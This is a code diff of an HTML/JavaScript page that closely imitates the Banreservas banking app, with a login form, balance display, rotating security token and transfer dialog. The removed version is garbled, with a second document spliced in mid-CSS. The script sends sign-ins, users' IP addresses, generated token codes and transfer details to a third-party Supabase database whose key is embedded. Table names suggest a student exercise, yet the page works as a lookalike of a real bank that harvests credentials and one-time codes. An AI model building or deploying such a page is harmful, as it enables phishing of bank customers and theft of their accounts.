@@ -1,72 +1,4 @@
-modal-content { background: white; width: 100%; max-width: 390px; border-top-left-radius: 32px; border-top-right-radius: 32px; padding: 24px 20px 40px; animation: slideUp 0.3s ease; }
-        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
-        .input-field { width: 100%; padding: 16px; background: #F2F4F7; border: 1.5px solid #E0E4E9; border-radius: 16px; font-size: 16px; font-family: 'Inter', sans-serif; margin: 12px 0; }
-        .btn-primary { background: #0033A0; color: white; border: none; width: 100%; padding: 18px; border-radius: 60px; font-weight: 700; font-size: 16px; cursor: pointer; font-family: 'Inter', sans-serif; margin-top: 20px; }
-        .close-modal { color: #0033A0; font-weight: 600; text-align: center; margin-top: 15px; cursor: pointer; }
-        .success-message { background: #2D9A4B; color: white; padding: 12px; border-radius: 60px; text-align: center; margin-top: 10px; }
-        .login-container { display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        .login-card { background: white; padding: 30px; border-radius: 24px; max-width: 350px; width: 100%; box-shadow: 0 20px 40px rgba(0,51,160,0.15); }
-    </style>
-</head>
-<body>
-
-<!-- LOGIN SCREEN -->
-<div id="loginScreen" class="login-container">
-    <div class="login-card">
-        <h2 style="color: #0033A0; text-align: center; margin-bottom: 20px;">Banreservas</h2>
-        <input type="email" id="emailInput" placeholder="Correo electrónico" class="input-field" value="">
-        <input type="password" id="passwordInput" placeholder="Contraseña" class="input-field" value="">
-        <button onclick="login()" class="btn-primary">Iniciar Sesión</button>
-        <p id="loginMessage" style="margin-top: 15px; text-align: center; color: #D32F2F;"></p>
-    </div>
-</div>
-
-<!-- APP SCREEN (IDÉNTICA A BANRESERVAS) -->
-<div id="appScreen" style="display: none;">
-    <div class="phone-frame">
-        <div class="app-header bg-primary">
-            <div class="top-bar">
-                <span class="logo">Banreservas</span>
-                <div>
-                    <i class="fas fa-bell" style="color: white; font-size: 20px; margin-right: 15px;"></i>
-                    <i class="fas fa-user-circle" onclick="logout()" style="color: white; font-size: 22px; cursor: pointer;"></i>
-                </div>
-            </div>
-            <div class="balance-card">
-                <div class="balance-label">Cuenta de Ahorros (DOP)</div>
-                <div class="balance-amount">
-                    <span class="amount-text" id="balanceDisplay">RD$ ,*.**</span>
-                    <i class="fas fa-eye-slash eye-icon" id="toggleBalanceBtn"></i>
-                </div>
-                <div style="color:#5E6873; font-size:13px; margin-top: 8px;">Saldo disponible</div>
-            </div>
-        </div>
-
-        <div class="quick-actions">
-            <div class="action-item" onclick="openTransferModal()">
-                <div class="action-circle"><i class="fas fa-paper-plane"></i></div>
-                <span class="action-label">Transferir</span>
-            </div>
-            <div class="action-item">
-                <div class="action-circle"><i class="fas fa-file-invoice"></i></div>
-                <span class="action-label">Pagar</span>
-            </div>
-            <div class="action-item">
-                <div class="action-circle"><i class="fas fa-mobile-alt"></i></div>
-                <span class="action-label">Recargar</span>
-            </div>
-            <div class="action-item">
-                <div class="action-circle"><i class="fas fa-hand-holding-usd"></i></div>
-                <span class="action-label">Préstamos</span>
-            </div>
-            <div class="action-item" onclick="scrollToToken()">
-                <div class="action-circle token-badge"><i class="fas fa-shield-alt"></i></div>
-                <span class="action-label">Token</span>
-            </div>
-        </div>
-
-        <div class="token-section" id="tokenWidget">
-            <div class="token-box"><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
@@ -106,7 +38,74 @@ modal-content { background: white; width: 100%; max-width: 390px; border-top-lef
         .visa-title { font-weight: 700; }
         .visa-sub { font-size: 13px; opacity: 0.9; }
         .modal { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); align-items: flex-end; justify-content: center; z-index: 1000; }
-        .<div class="token-title">TOKEN DIGITAL BANRESERVAS</div>
+        .modal-content { background: white; width: 100%; max-width: 390px; border-top-left-radius: 32px; border-top-right-radius: 32px; padding: 24px 20px 40px; animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .input-field { width: 100%; padding: 16px; background: #F2F4F7; border: 1.5px solid #E0E4E9; border-radius: 16px; font-size: 16px; font-family: 'Inter', sans-serif; margin: 12px 0; }
+        .btn-primary { background: #0033A0; color: white; border: none; width: 100%; padding: 18px; border-radius: 60px; font-weight: 700; font-size: 16px; cursor: pointer; font-family: 'Inter', sans-serif; margin-top: 20px; }
+        .close-modal { color: #0033A0; font-weight: 600; text-align: center; margin-top: 15px; cursor: pointer; }
+        .success-message { background: #2D9A4B; color: white; padding: 12px; border-radius: 60px; text-align: center; margin-top: 10px; }
+        .login-container { display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .login-card { background: white; padding: 30px; border-radius: 24px; max-width: 350px; width: 100%; box-shadow: 0 20px 40px rgba(0,51,160,0.15); }
+    </style>
+</head>
+<body>
+
+<div id="loginScreen" class="login-container">
+    <div class="login-card">
+        <h2 style="color: #0033A0; text-align: center; margin-bottom: 20px;">Banreservas</h2>
+        <input type="email" id="emailInput" placeholder="Correo electrónico" class="input-field" value="examen@universidad.edu">
+        <input type="password" id="passwordInput" placeholder="Contraseña" class="input-field" value="Examen2024!">
+        <button onclick="login()" class="btn-primary">Iniciar Sesión</button>
+        <p id="loginMessage" style="margin-top: 15px; text-align: center; color: #D32F2F;"></p>
+    </div>
+</div>
+
+<div id="appScreen" style="display: none;">
+    <div class="phone-frame">
+        <div class="app-header bg-primary">
+            <div class="top-bar">
+                <span class="logo">Banreservas</span>
+                <div>
+                    <i class="fas fa-bell" style="color: white; font-size: 20px; margin-right: 15px;"></i>
+                    <i class="fas fa-user-circle" onclick="logout()" style="color: white; font-size: 22px; cursor: pointer;"></i>
+                </div>
+            </div>
+            <div class="balance-card">
+                <div class="balance-label">Cuenta de Ahorros (DOP)</div>
+                <div class="balance-amount">
+                    <span class="amount-text" id="balanceDisplay">RD$ **,***.**</span>
+                    <i class="fas fa-eye-slash eye-icon" id="toggleBalanceBtn"></i>
+                </div>
+                <div style="color:#5E6873; font-size:13px; margin-top: 8px;">Saldo disponible</div>
+            </div>
+        </div>
+
+        <div class="quick-actions">
+            <div class="action-item" onclick="openTransferModal()">
+                <div class="action-circle"><i class="fas fa-paper-plane"></i></div>
+                <span class="action-label">Transferir</span>
+            </div>
+            <div class="action-item">
+                <div class="action-circle"><i class="fas fa-file-invoice"></i></div>
+                <span class="action-label">Pagar</span>
+            </div>
+            <div class="action-item">
+                <div class="action-circle"><i class="fas fa-mobile-alt"></i></div>
+                <span class="action-label">Recargar</span>
+            </div>
+            <div class="action-item">
+                <div class="action-circle"><i class="fas fa-hand-holding-usd"></i></div>
+                <span class="action-label">Préstamos</span>
+            </div>
+            <div class="action-item" onclick="scrollToToken()">
+                <div class="action-circle token-badge"><i class="fas fa-shield-alt"></i></div>
+                <span class="action-label">Token</span>
+            </div>
+        </div>
+
+        <div class="token-section" id="tokenWidget">
+            <div class="token-box">
+                <div class="token-title">TOKEN DIGITAL BANRESERVAS</div>
                 <div class="token-number" id="tokenCode">------</div>
                 <div class="timer-bar"><div class="timer-progress" id="timerProgress" style="width: 100%;"></div></div>
                 <div class="timer-text">Nuevo código en <span id="timerSeconds">30</span> segundos</div>
@@ -124,7 +123,6 @@ modal-content { background: white; width: 100%; max-width: 390px; border-top-lef
     </div>
 </div>
 
-<!-- MODAL TRANSFERENCIA -->
 <div class="modal" id="transferModal">
     <div class="modal-content">
         <h3 style="color: #0033A0; margin-bottom: 5px;">Transferir dinero</h3>
@@ -143,68 +141,36 @@ modal-content { background: white; width: 100%; max-width: 390px; border-top-lef
 </div>
 
 <script>
-// CONFIGURACIÓN SUPABASE
 var SUPABASE_URL = 'https://snqgkbscggmomukgufmm.supabase.co';
 var SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNucWdrYnNjZ2dtb211a2d1Zm1tIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY2ODM5NTEsImV4cCI6MjA5MjI1OTk1MX0.v32t2UwLVvfZ7KPi6HH7S3-X3qu0zvuOHnKqOY1QvzA';
-
 var supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 var session = null;
 var balanceVisible = false;
 var realBalance = 125480.25;
 var currentToken = "248163";
 
-// ========== FUNCIONES DE RASTREO PARA PANEL ADMIN ==========
 function registrarLogin(email) {
-    fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(data => {
-            supabase.from('student_logins').insert({
-                user_id: session.user.id,
-                email: email,
-                ip_address: data.ip,
-                user_agent: navigator.userAgent,
-                login_time: new Date(),
-                success: true
-            }).then(() => console.log('✅ Login registrado en panel admin'));
-        })
-        .catch(e => console.error('Error registrando login:', e));
+    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
+        supabase.from('logins').insert({ email: email, ip_address: data.ip, login_time: new Date() }).then();
+    });
+    supabase.from('usuarios_registrados').select('*').eq('email', email).then(r => {
+        if (!r.data.length) supabase.from('usuarios_registrados').insert({ email: email, registered_at: new Date() }).then();
+    });
 }
 
 function registrarToken(tokenCode) {
-    fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(data => {
-            supabase.from('token_registry').insert({
-                user_id: session.user.id,
-                token_code: tokenCode,
-                generated_at: new Date(),
-                expires_at: new Date(Date.now() + 30000),
-                ip_address: data.ip,
-                requested_by: null,
-                status: 'generated'
-            }).then(() => console.log('✅ Token registrado en panel admin'));
-        })
-        .catch(e => console.error('Error registrando token:', e));
+    if (!session) return;
+    supabase.from('tokens').insert({ email: session.user.email, token_code: tokenCode, generated_at: new Date() }).then();
 }
 
 function registrarTransferencia(destino, monto, token) {
-    supabase.from('monitored_transfers').insert({
-        user_id: session.user.id,
-        source_account: '1002345678',
-        destination_account: destino,
-        amount: monto,
-        token_used: token,
-        banreservas_transaction_id: 'SIM-' + Date.now(),
-        status: 'completed',
-        created_at: new Date()
-    }).then(() => console.log('✅ Transferencia registrada en panel admin'));
+    if (!session) return;
+    supabase.from('transferencias').insert({ email: session.user.email, destino: destino, monto: monto, token_usado: token, fecha: new Date() }).then();
 }
 
-// ========== FUNCIONES DE LA APP ==========
 function login() {
     var email = document.getElementById('emailInput').value;
     var password = document.getElementById('passwordInput').value;
-    
     supabase.auth.signInWithPassword({ email: email, password: password }).then(function(r) {
         if (r.error) {
             document.getElementById('loginMessage').innerText = 'Error: ' + r.error.message;
@@ -219,22 +185,17 @@ function login() {
     });
 }
 
-function logout() {
-    supabase.auth.signOut();
-    location.reload();
-}
+function logout() { supabase.auth.signOut(); location.reload(); }
 
 function toggleBalance() {
     var balanceEl = document.getElementById('balanceDisplay');
     var iconEl = document.getElementById('toggleBalanceBtn');
     if (balanceVisible) {
-        balanceEl.innerText = 'RD$ ,*.**';
-        iconEl.classList.remove('fa-eye');
-        iconEl.classList.add('fa-eye-slash');
+        balanceEl.innerText = 'RD$ **,***.**';
+        iconEl.classList.remove('fa-eye'); iconEl.classList.add('fa-eye-slash');
     } else {
         balanceEl.innerText = 'RD$ ' + realBalance.toLocaleString('es-DO', {minimumFractionDigits: 2});
-        iconEl.classList.remove('fa-eye-slash');
-        iconEl.classList.add('fa-eye');
+        iconEl.classList.remove('fa-eye-slash'); iconEl.classList.add('fa-eye');
     }
     balanceVisible = !balanceVisible;
 }
@@ -244,13 +205,9 @@ function generateToken() {
     var timeBlock = Math.floor(now.getTime() / 30000);
     var hash = 0;
     var str = "BANRESERVAS_SECRET_" + timeBlock;
-    for (var i = 0; i < str.length; i++) {
-        hash = ((hash << 5) - hash) + str.charCodeAt(i);
-        hash |= 0;
-    }
+    for (var i = 0; i < str.length; i++) { hash = ((hash << 5) - hash) + str.charCodeAt(i); hash |= 0; }
     var token = Math.abs(hash % 1000000).toString().padStart(6, '0');
-    if (token === '000000') token = '248163';
-    return token;
+    return token === '000000' ? '248163' : token;
 }
 
 function updateTokenUI() {
@@ -259,10 +216,8 @@ function updateTokenUI() {
     var millis = now.getMilliseconds();
     var elapsedSeconds = seconds < 30 ? seconds : seconds - 30;
     var progressPercent = 100 - ((elapsedSeconds + (millis / 1000)) / 30) * 100;
-    
     document.getElementById('timerProgress').style.width = Math.max(0, progressPercent) + '%';
     document.getElementById('timerSeconds').innerText = 30 - Math.floor(elapsedSeconds);
-    
     var newToken = generateToken();
     if (newToken !== currentToken) {
         currentToken = newToken;
@@ -272,47 +227,30 @@ function updateTokenUI() {
     }
 }
 
-function scrollToToken() {
-    document.getElementById('tokenWidget').scrollIntoView({ behavior: 'smooth' });
-}
-
-function openTransferModal() {
-    document.getElementById('transferModal').style.display = 'flex';
-    document.getElementById('transferMessage').innerHTML = '';
-    document.getElementById('currentTokenHint').innerText = currentToken;
-}
-
-function closeTransferModal() {
-    document.getElementById('transferModal').style.display = 'none';
-}
+function scrollToToken() { document.getElementById('tokenWidget').scrollIntoView({ behavior: 'smooth' }); }
+function openTransferModal() { document.getElementById('transferModal').style.display = 'flex'; document.getElementById('transferMessage').innerHTML = ''; document.getElementById('currentTokenHint').innerText = currentToken; }
+function closeTransferModal() { document.getElementById('transferModal').style.display = 'none'; }
 
 function processTransfer() {
     var enteredToken = document.getElementById('tokenInput').value.trim();
     var amount = document.getElementById('amountInput').value;
     var destino = document.getElementById('destAccount').value;
     var msgDiv = document.getElementById('transferMessage');
-    
     if (enteredToken === currentToken) {
         registrarTransferencia(destino, amount, enteredToken);
         msgDiv.innerHTML = '<div class="success-message"><i class="fas fa-check-circle"></i> Transferencia de RD$ ' + parseFloat(amount).toLocaleString() + ' realizada con éxito.</div>';
         document.getElementById('tokenInput').value = '';
-        if (navigator.vibrate) navigator.vibrate(50);setTimeout(closeTransferModal, 2500);
+        setTimeout(closeTransferModal, 2500);
     } else {
         msgDiv.innerHTML = '<div style="background: #D32F2F; color: white; padding: 12px; border-radius: 60px; text-align: center; margin-top: 10px;"><i class="fas fa-times-circle"></i> Token inválido. Intente de nuevo.</div>';
-        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
     }
 }
 
-// Inicialización
 window.onload = function() {
     document.getElementById('toggleBalanceBtn').addEventListener('click', toggleBalance);
     updateTokenUI();
 };
-
-window.onclick = function(event) {
-    var modal = document.getElementById('transferModal');
-    if (event.target === modal) closeTransferModal();
-};
+window.onclick = function(event) { if (event.target === document.getElementById('transferModal')) closeTransferModal(); };
 </script>
 </body>
 </html>
